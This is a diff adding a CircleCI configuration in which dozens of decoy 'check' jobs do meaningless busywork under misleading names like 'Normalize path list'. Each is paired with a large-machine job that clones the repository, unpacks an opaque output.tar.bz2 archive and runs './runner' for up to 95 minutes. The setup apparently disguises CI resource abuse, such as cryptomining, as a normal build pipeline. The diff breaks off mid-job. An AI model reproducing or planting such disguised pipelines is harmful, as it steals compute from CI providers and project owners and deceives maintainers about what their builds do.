@@ -1,0 +1,1873 @@
+version: 2.1
+
+jobs:
+  sys_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/ci-ws
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/ci-ws/bundle; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/ci-ws/bundle; done; true
+            size=$(wc -c </tmp/ci-ws/bundle); echo "stage ok: green-light size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - bundle
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/bundle && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  stepA_sam-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; yes abc | head -n 303914 | sha256sum; true ; } > /tmp/ci-ws/gate-pass.out
+            size=$(wc -c </tmp/ci-ws/gate-pass.out); echo "stage ok: sam-ci size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - gate-pass.out
+  sam-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/gate-pass.out && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  canary_t-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Audit path segments
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 1M /dev/urandom | base64 | wc -c; true ; } > /tmp/ci-ws/artifact.tgz
+            size=$(wc -c </tmp/ci-ws/artifact.tgz); echo "stage ok: t-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - artifact.tgz
+  t-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/artifact.tgz && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  green_rm-webhook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Score branch coverage
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=1;a++)for(b=1;b<=26690;b++)s+=a*b;print s}'; true ; } > /tmp/ci-ws/phase-complete.sig
+            size=$(wc -c </tmp/ci-ws/phase-complete.sig); echo "stage ok: rm-webhook size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - phase-complete.sig
+  rm-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/phase-complete.sig && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  go_rl-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 499916 | sha1sum; true ; } > /tmp/ci-ws/2024-07-21.data
+            size=$(wc -c </tmp/ci-ws/2024-07-21.data); echo "stage ok: rl-x size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2024-07-21.data
+  rl-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/2024-07-21.data && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  prefetch_uma-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 2 79692 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/ci-ws/log.ndjson
+            size=$(wc -c </tmp/ci-ws/log.ndjson); echo "stage ok: uma-ci size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - log.ndjson
+  uma-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/log.ndjson && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  redo_RunApp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Precompute lookup
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<266186;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/ci-ws/counts.csv
+            size=$(wc -c </tmp/ci-ws/counts.csv); echo "stage ok: RunApp size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - counts.csv
+  RunApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/counts.csv && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  linter_kilo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Rotate build log
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 134926 | awk 'END{print NR}'; true ; } > /tmp/ci-ws/stage-done.txt
+            size=$(wc -c </tmp/ci-ws/stage-done.txt); echo "stage ok: kilo size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage-done.txt
+  kilo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/stage-done.txt && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  vendor_vela-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 102400 | fold -w8 | sort -u | wc -l; true ; } > /tmp/ci-ws/132a.data
+            size=$(wc -c </tmp/ci-ws/132a.data); echo "stage ok: vela-plus size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 132a.data
+  vela-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/132a.data && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  fetcher_ci-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Pivot result stream
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1945600 | wc -c; true ; } > /tmp/ci-ws/buffer.bin
+            size=$(wc -c </tmp/ci-ws/buffer.bin); echo "stage ok: ci-3 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - buffer.bin
+  ci-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/buffer.bin && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  Gamma_fiona-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=405382;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/ci-ws/.marker
+            size=$(wc -c </tmp/ci-ws/.marker); echo "stage ok: fiona-test size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .marker
+  fiona-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/.marker && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  canary_update-retry-glitch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Rank query plans
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 290260 | paste - - - - | wc -l; true ; } > /tmp/ci-ws/step-29.log
+            size=$(wc -c </tmp/ci-ws/step-29.log); echo "stage ok: update-retry-glitch size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-29.log
+  update-retry-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/step-29.log && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  B_intergration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 12582912 /dev/urandom | sha256sum; true ; } > /tmp/ci-ws/21.data
+            size=$(wc -c </tmp/ci-ws/21.data); echo "stage ok: intergration size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 21.data
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/21.data && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  ctx_LAB_CHECK_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 457658 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/ci-ws/report.out
+            size=$(wc -c </tmp/ci-ws/report.out); echo "stage ok: LAB_CHECK_3 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - report.out
+  LAB_CHECK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/report.out && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  phase1_ruby3-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Rebase partial order
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 460223 | awk '{if($1&1)o++;else e++}END{print o"/"e}'; true ; } > /tmp/ci-ws/main_job_output.log
+            size=$(wc -c </tmp/ci-ws/main_job_output.log); echo "stage ok: ruby3-build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - main_job_output.log
+  ruby3-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/main_job_output.log && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  postbuild_v5-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Enumerate line counts
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 302294 | awk '{if($1&1)o++;else e++}END{print o"/"e}'; true ; } > /tmp/ci-ws/result.txt
+            size=$(wc -c </tmp/ci-ws/result.txt); echo "stage ok: v5-canary size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - result.txt
+  v5-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/result.txt && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  spinner_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Spool byte frames
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 2 11414 | factor | wc -l; true ; } > /tmp/ci-ws/OK.txt
+            size=$(wc -c </tmp/ci-ws/OK.txt); echo "stage ok: spin-up size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - OK.txt
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/OK.txt && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  A_helios-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 51759); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/ci-ws/.state
+            size=$(wc -c </tmp/ci-ws/.state); echo "stage ok: helios-rc size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .state
+  helios-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/.state && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  step2_fiona-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 112690 | awk '{s+=$1}END{print s}'; true ; } > /tmp/ci-ws/stage.dat
+            size=$(wc -c </tmp/ci-ws/stage.dat); echo "stage ok: fiona-verify size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage.dat
+  fiona-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/stage.dat && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  reserve_node20-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Compute aggregate hash
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 73926 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/ci-ws/pt-A.pkl
+            size=$(wc -c </tmp/ci-ws/pt-A.pkl); echo "stage ok: node20-bench size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - pt-A.pkl
+  node20-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/pt-A.pkl && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  dispatch_java17-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Scan dependency graph
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 82022 | md5sum; true ; } > /tmp/ci-ws/bundle.bin
+            size=$(wc -c </tmp/ci-ws/bundle.bin); echo "stage ok: java17-lint size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - bundle.bin
+  java17-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/bundle.bin && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  dispatch_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 4608000 | base64 | head -c 200 | wc -c; true ; } > /tmp/ci-ws/full_step_output.out
+            size=$(wc -c </tmp/ci-ws/full_step_output.out); echo "stage ok: defualt size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - full_step_output.out
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/full_step_output.out && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  db_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 268601 | awk 'NR>9783 && NR<10588{s+=$1}END{print s}'; true ; } > /tmp/ci-ws/03.data
+            size=$(wc -c </tmp/ci-ws/03.data); echo "stage ok: fire-up size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 03.data
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/03.data && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  orchestrate_io-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Collect retire counts
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=2641700;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/ci-ws/stash.raw
+            size=$(wc -c </tmp/ci-ws/stash.raw); echo "stage ok: io-rc size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stash.raw
+  io-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/stash.raw && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  phase1_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pack vendor fragments
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 486772 | awk 'NR%20==0{sum+=$1}END{print sum}'; true ; } > /tmp/ci-ws/step-ready.txt
+            size=$(wc -c </tmp/ci-ws/step-ready.txt); echo "stage ok: preview size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-ready.txt
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/step-ready.txt && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  spinner_titan2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Snapshot heap stats
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 286720 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/ci-ws/step-27.log
+            size=$(wc -c </tmp/ci-ws/step-27.log); echo "stage ok: titan2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-27.log
+  titan2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/step-27.log && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  route_q3-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Fuzz boundary edges
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 17364); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/ci-ws/775.out
+            size=$(wc -c </tmp/ci-ws/775.out); echo "stage ok: q3-release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
